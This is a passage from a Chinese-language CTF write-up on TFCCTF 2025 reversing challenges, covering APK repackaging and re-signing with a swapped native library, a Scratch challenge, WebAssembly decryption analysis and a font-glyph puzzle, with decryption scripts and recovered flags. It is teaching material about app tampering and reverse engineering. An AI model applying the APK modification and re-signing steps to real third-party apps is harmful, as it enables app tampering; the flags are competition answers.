<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d app-release.apk -o app-src</span><br></pre></td></tr></table></figure>

<p>然后替换新的so，此外还需要修改AndroidManifest.xml里extractNativeLibs的值为true</p>
<p>直接替换apk里的so会报错adb: failed to install app.apk: Failure [INSTALL_FAILED_INVALID_APK: Failed to extract native libraries, res&#x3D;-2]，因为可能进行了deflate压缩，就算选择了store依然报错</p>
<p>接着apktool打包</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b app-src -o app-<span class="type">unsigned</span>.apk</span><br></pre></td></tr></table></figure>

<p>此时得到apk没有签名没法安装的，会报错adb: failed to install app-unsigned.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from &#x2F;data&#x2F;app&#x2F;vmdl1700332527.tmp&#x2F;base.apk: Attempt to get length of null array]</p>
<p>此时需要先生成key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keytool -genkey -v -keystore test.jks -keyalg RSA -keysize 2048 -validity 10000 -alias testkey</span><br></pre></td></tr></table></figure>

<p>然后找到android sdk下的apksigner.bat</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F:\android\build-tools\35.0.1\apksigner.bat sign --ks test.jks --ks-key-alias testkey --out app-signed.apk app-unsigned.apk</span><br></pre></td></tr></table></figure>

<p>然后就可以安装，再次执行上面的广播命令，结束后，点看apk去log里即可看到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">08-30 00:00:03.162 12473 12473 D OXI     : Got broadcast, seed=fe2o3rust</span><br><span class="line">08-30 00:00:03.166 12473 12473 D OXI     : Required seed is: fe2o3rust</span><br><span class="line">08-30 00:00:03.166 12473 12473 D OXI     : Computing flag for seed=&#x27;fe2o3rust&#x27; ...</span><br><span class="line">08-30 00:00:04.187 12473 12473 D OXI     : anti_hook_check elapsed=1020ms</span><br><span class="line">08-30 00:01:09.162 12473 12473 D OXI     : FLAG=TFCCTF&#123;167e3ce3c65387c6e981c31c39ac7839&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="scratching-machine">SCRATCHING MACHINE</span><a href="#scratching-machine" class="header-anchor"></a></h2><p>很复杂的积木语言题scratch，碰到这种直接用工具即可</p>
<p><a href="https://github.com/BirdLogics/sb3topy">https://github.com/BirdLogics/sb3topy</a></p>
<p>转成python直接喂给ai写脚本，代码很长不放了，用上面的工具输出应该都一样，直接给出解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 从原始代码中复制的 cacamaca 列表</span></span><br><span class="line">cacamaca = [</span><br><span class="line">    <span class="number">17</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">142</span>, <span class="number">113</span>, <span class="number">44</span>, <span class="number">30</span>, <span class="number">4</span>, <span class="number">30</span>, <span class="number">188</span>, <span class="number">142</span>, <span class="number">85</span>, <span class="number">54</span>, <span class="number">77</span>, <span class="number">46</span>, <span class="number">212</span>, <span class="number">151</span>, <span class="number">22</span>, <span class="number">149</span>, <span class="number">190</span>, <span class="number">68</span>, <span class="number">143</span>, <span class="number">14</span>, <span class="number">165</span>, <span class="number">95</span>, <span class="number">28</span>, <span class="number">189</span>, <span class="number">158</span>, <span class="number">100</span>, <span class="number">87</span>, <span class="number">252</span>, <span class="number">143</span>, <span class="number">117</span>, <span class="number">206</span>, <span class="number">133</span>, <span class="number">38</span>, <span class="number">101</span>, <span class="number">159</span>, <span class="number">4</span>, <span class="number">31</span>, <span class="number">140</span>, <span class="number">135</span>, <span class="number">36</span>, <span class="number">63</span>, <span class="number">124</span>, <span class="number">55</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">133</span>, <span class="number">30</span>, <span class="number">101</span>, <span class="number">6</span>, <span class="number">181</span>, <span class="number">158</span>, <span class="number">100</span>, <span class="number">15</span>, <span class="number">196</span>, <span class="number">62</span>, <span class="number">69</span>, <span class="number">230</span>, <span class="number">165</span>, <span class="number">142</span>, <span class="number">29</span>, <span class="number">231</span>, <span class="number">252</span>, <span class="number">191</span>, <span class="number">180</span>, <span class="number">215</span>, <span class="number">76</span>, <span class="number">182</span>, <span class="number">197</span>, <span class="number">190</span>, <span class="number">5</span>, <span class="number">238</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">35</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">28</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">37</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">35</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">39</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">69</span>, <span class="number">148</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">35</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">69</span>, <span class="number">35</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">41</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">141</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">69</span>, <span class="number">191</span>, <span class="number">38</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror</span>(<span class="params">n, bits, width=<span class="number">8</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;8位循环右移函数&quot;&quot;&quot;</span></span><br><span class="line">    mask = (<span class="number">1</span> &lt;&lt; width) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ((n &gt;&gt; bits) | (n &lt;&lt; (width - bits))) &amp; mask</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥是 mem[2] (即 cacamaca[1])</span></span><br><span class="line">key = cacamaca[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据块 D 是从 cacamaca 索引 72 开始的 69 个字节</span></span><br><span class="line"><span class="comment"># D_i 对应 cacamaca[i+71]</span></span><br><span class="line">data_block = cacamaca[<span class="number">72</span>:<span class="number">72</span> + <span class="number">69</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储 Flag 的列表</span></span><br><span class="line">flag_bytes = [<span class="number">0</span>] * <span class="number">69</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 开始逆向计算 ---</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 Flag 的第一个字节 (O_3)</span></span><br><span class="line"><span class="comment"># O_3 = ROR(D_3 ^ O_2, 3)</span></span><br><span class="line">xor_val_0 = data_block[<span class="number">0</span>] ^ key</span><br><span class="line">flag_bytes[<span class="number">0</span>] = ror(xor_val_0, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环计算 Flag 的剩余字节</span></span><br><span class="line"><span class="comment"># O_&#123;i+2&#125; = ROR(D_&#123;i+2&#125; ^ D_&#123;i+1&#125;, 3)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data_block) - <span class="number">1</span>):</span><br><span class="line">    xor_val_i = data_block[i+<span class="number">1</span>] ^ data_block[i]</span><br><span class="line">    flag_bytes[i+<span class="number">1</span>] = ror(xor_val_i, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将字节转换为字符串</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag_bytes))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;获取到的 Flag 是:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2><span id="mccrab2">MCCRAB2</span><a href="#mccrab2" class="header-anchor"></a></h2><p>wasm逆向，根目录python起一个http（python -m http.server 8888），然后127.0.0.1:8888打开即可使用index.html，同时还可以调试wasm代码</p>
<p>首先还是wasm2c编译出来，得到可执行文件ida反编译更好分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wasm2c wasm_oscn_bg.wasm -o out.c</span><br><span class="line">gcc -c out.c -o out.o</span><br></pre></td></tr></table></figure>

<p>根据题目给的lib.rs可知核心加密比较逻辑都在check_flag、encrypt等里面</p>
<p>法一：动态调试</p>
<p>得到o文件后ida分析找check_flag等函数，结合wat代码可以发现data 1049113位置处有特殊字符串<code>C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDFcheia_osc_plugenc</code></p>
<p>在c代码中发现比较点，可以看到后面有wrong、correct</p>
<p><img src="../images/2025-TFCCTF/16.png" alt="1"></p>
<p>回到浏览器里源代码wasm搜1049113（此时已经转为了wat代码，还是可以读的）下断点</p>
<p><img src="../images/2025-TFCCTF/17.png" alt="1"></p>
<p>输入框输入6个a结果发现没有断下来，说明压根没有到比较点（下断点在encrypt等同样发现没有被调用）</p>
<figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">local.get $var2</span><br><span class="line"><span class="type">i32</span>.load offset=<span class="number">36</span></span><br><span class="line"><span class="type">i32</span>.<span class="keyword">const</span> <span class="number">134</span></span><br><span class="line"><span class="type">i32</span>.eq</span><br><span class="line">if</span><br><span class="line">  local.get $var2</span><br><span class="line">  <span class="type">i32</span>.load offset=<span class="number">32</span></span><br><span class="line">  local.<span class="keyword">set</span> $var4</span><br><span class="line">  <span class="type">i32</span>.<span class="keyword">const</span> <span class="number">0</span></span><br><span class="line">  local.<span class="keyword">set</span> $var0</span><br><span class="line">  <span class="type">i32</span>.<span class="keyword">const</span> <span class="number">134</span></span><br><span class="line">  local.<span class="keyword">set</span> $var1</span><br><span class="line">  <span class="type">i32</span>.<span class="keyword">const</span> <span class="number">1049113</span></span><br></pre></td></tr></table></figure>

<p>从1049113往上找发现一处if比较，可以在local.get $var2下断点发现此时可以断下来，说明我们没有进到这个if</p>
<p><img src="../images/2025-TFCCTF/18.png" alt="1"></p>
<p>调试发现比较12和134，12正好是我们输入的6个a的16进制长度；134同样也是<code>C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF</code></p>
<p>因此可知输入应该是67位，直接怼a*67进去看比较点</p>
<p>点击下图里的内存可以查看值</p>
<p><img src="../images/2025-TFCCTF/19.png" alt="1"></p>
<p>调试到下图时候看到给了一个比较大的地址，查看内存发现正好是输入加密完的结果</p>
<p><img src="../images/2025-TFCCTF/20.png" alt="1"></p>
<p>结合前面obf_key长度14（<code>cheia_osc_plug</code>，check_flag开头有一组while循环14次，按模3结果处理了key），观察发现这个组16进制值出现了循环，因此直接猜测只做了简单的异或，我们要做的只需要提取出来异或的值即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xor = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;e1cfc4e8f9fdedc9f91bc3ffe0fd&quot;</span>))</span><br><span class="line">xor = [i^<span class="number">97</span> <span class="keyword">for</span> i <span class="keyword">in</span> xor]</span><br><span class="line"><span class="built_in">print</span>(xor)</span><br><span class="line">cmp = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cmp)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(cmp[i]^xor[i%<span class="built_in">len</span>(xor)]), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[128, 174, 165, 137, 152, 156, 140, 168, 152, 122, 162, 158, 129, 156]</span><br><span class="line">CTF&#123;wh3n_w3_p4rt_w4ys__https://www.youtube.com/watch?v=EtrL9NkEphg&#125;</span><br></pre></td></tr></table></figure>

<p>法二：静态分析算法</p>
<p>ida分析w2c_wasm__oscn__bg_encrypt_0,核心加密函数w2c_wasm__oscn__bg_f3，分析这个函数得到以下加密逻辑</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v106 = n1114112_1 ^ (n1114112_2 + <span class="number">57</span>);</span><br><span class="line">n0x80 = (<span class="type">unsigned</span> __int8)(n1114112_1 ^ (n1114112_2 + <span class="number">57</span>));</span><br><span class="line">n0x80_1 = n0x80;</span><br></pre></td></tr></table></figure>

<p>n1114112_1是明文，n1114112_2是密钥，那么逻辑是 enc[i]&#x3D;msg[i]^(key[i]+57),</p>
<p>其余都是unicode解码的逻辑</p>
<p>继续分析w2c_wasm__oscn__bg_check_flag_0，检索到关键逻辑如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">n2_1 = v68 % <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> ( n2_1 == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( n0x10000 - <span class="number">97</span> &gt;= <span class="number">0x1A</span> )</span><br><span class="line">        n0x80 = n0x10000;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        n0x80 = n0x10000 &amp; <span class="number">0x5F</span>;   <span class="comment">// 小写字母转大写</span></span><br><span class="line">    n0x10000 = n0x80;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( n2_1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> ( n0x10000 - <span class="number">65</span> &gt;= <span class="number">0x1A</span> )</span><br><span class="line">        n0x10000_1 = n0x10000;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        n0x10000_1 = n0x10000 | <span class="number">0x20</span>; <span class="comment">//大写字母转小写</span></span><br><span class="line">      n0x10000 = n0x10000_1;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="comment">//不做处理</span></span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">while</span> ( n14 != <span class="number">14</span> );</span><br></pre></td></tr></table></figure>

<p>这部分是对密钥逻辑进行处理，密钥长度是14，然后</p>
<p>对于index%3&#x3D;1：小写字母转为大写</p>
<p>对于index%3&#x3D;2：大写字母转小写</p>
<p>其他情况则不做处理</p>
<p>向下分析得到比较逻辑</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">   *(_DWORD *)(n5 + <span class="number">8</span>) = v19 + <span class="number">80</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">i32_load</span>(n5 + <span class="number">16</span>, v52 + <span class="number">36LL</span>) == <span class="number">134</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_138;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_144;</span><br><span class="line">    </span><br><span class="line">    LABEL_144:</span><br><span class="line">    <span class="built_in">i32_load8_u</span>(n5 + <span class="number">16</span>, <span class="number">1070265</span>);</span><br><span class="line">    v97 = <span class="built_in">w2c_wasm__oscn__bg_f75</span>(n5, <span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v97 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">i64_store</span>(n5 + <span class="number">16</span>, v97, <span class="string">&#x27;...gnorW&#x27;</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_150;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">w2c_wasm__oscn__bg_f66</span>(n5, <span class="number">1u</span>, <span class="number">8u</span>, <span class="number">0x10006Cu</span>);</span><br><span class="line">    <span class="built_in">wasm_rt_trap</span>(<span class="number">5</span>);</span><br><span class="line">LABEL_149:</span><br><span class="line">    <span class="built_in">w2c_wasm__oscn__bg_f66</span>(n5, <span class="number">1u</span>, <span class="number">8u</span>, <span class="number">0x10006Cu</span>);</span><br><span class="line">    <span class="built_in">wasm_rt_trap</span>(<span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">i32_load8_u</span>(n5 + <span class="number">16</span>, <span class="number">1070265</span>);</span><br><span class="line">    v97 = <span class="built_in">w2c_wasm__oscn__bg_f75</span>(n5, <span class="number">8</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v97 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_149;</span><br><span class="line">    <span class="built_in">i64_store</span>(n5 + <span class="number">16</span>, v97, <span class="string">&#x27;!tcerroC&#x27;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到比较了134长度的字符，结合rust推测是67字节，hex是134字节</p>
<p>然后从init找到密文为C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF</p>
<p>经过加密的密钥为cheia_osc_plug</p>
<p>总结一下整体的加密逻辑，输入长度67字节 ，密钥长度14字节，先把密钥按照模3的加密做一个处理，再把处理后的密钥加57与输入循环异或，那么可以写出如下的解密脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">ch, pos</span>):</span><br><span class="line">    <span class="keyword">if</span> pos % <span class="number">3</span> == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line">    <span class="keyword">elif</span> pos % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> ch.lower()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ch.upper()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform_key_once</span>(<span class="params">key</span>):</span><br><span class="line">    transformed = []</span><br><span class="line">    <span class="keyword">for</span> i, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(key):</span><br><span class="line">        transformed.append(T(ch, i))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(transformed)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>(<span class="params">enc_hex, key</span>):</span><br><span class="line">    bs = <span class="built_in">bytes</span>.fromhex(enc_hex)</span><br><span class="line">    tkey = transform_key_once(key)</span><br><span class="line"></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(bs):</span><br><span class="line">        kch = tkey[i % <span class="built_in">len</span>(tkey)]</span><br><span class="line">        k = (<span class="built_in">ord</span>(kch) + <span class="number">57</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        out.append(<span class="built_in">chr</span>(b ^ k))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(out)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;C3FAE3F2EFF4BFC6C70D91C1F1A8F2DAFAFEACE5FFF7C712D6EAF1EFBA818AFEEFEBA2D1F70FD6EBE3F9AECDCAE4B7EBEDDCFB129DE8BCD9F4DCE9B0D6F7C9D8F01DDF&quot;</span></span><br><span class="line">key = <span class="string">&quot;gulp_cso_aiehc&quot;</span></span><br><span class="line"></span><br><span class="line">flag = decrypt_flag(enc, key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h2><span id="font-leagues">FONT LEAGUES</span><a href="#font-leagues" class="header-anchor"></a></h2><p>验证端口告诉我们输入正确的flag会变成O，那么下载FontForge找到唯一的O</p>
<p><img src="../images/2025-TFCCTF/21.png" alt="1"></p>
<p>O162e219bca79a462f9cf5701124cf74c</p>
<p>然后写一个映射表的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fontTools.ttLib <span class="keyword">import</span> TTFont</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载字体文件</span></span><br><span class="line">font_path = <span class="string">&quot;Arial-custom.ttf&quot;</span></span><br><span class="line">font = TTFont(font_path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 Unicode -&gt; glyph name 映射</span></span><br><span class="line">cmap = font[<span class="string">&#x27;cmap&#x27;</span>].getBestCmap()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 glyph name -&gt; Unicode 映射（反向）</span></span><br><span class="line">glyph_to_unicode = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> uni, glyph_name <span class="keyword">in</span> cmap.items():</span><br><span class="line">    <span class="keyword">if</span> glyph_name <span class="keyword">not</span> <span class="keyword">in</span> glyph_to_unicode:</span><br><span class="line">        glyph_to_unicode[glyph_name] = []</span><br><span class="line">    glyph_to_unicode[glyph_name].append(<span class="built_in">chr</span>(uni))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 mapping.txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;mapping.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;Glyph Name -&gt; Unicode Characters\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> glyph, chars <span class="keyword">in</span> glyph_to_unicode.items():</span><br><span class="line">        f.write(<span class="string">f&quot;<span class="subst">&#123;glyph&#125;</span> -&gt; <span class="subst">&#123;<span class="string">&#x27;&#x27;</span>.join(chars)&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;映射表已写入 mapping.txt&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>展示部分：</p>
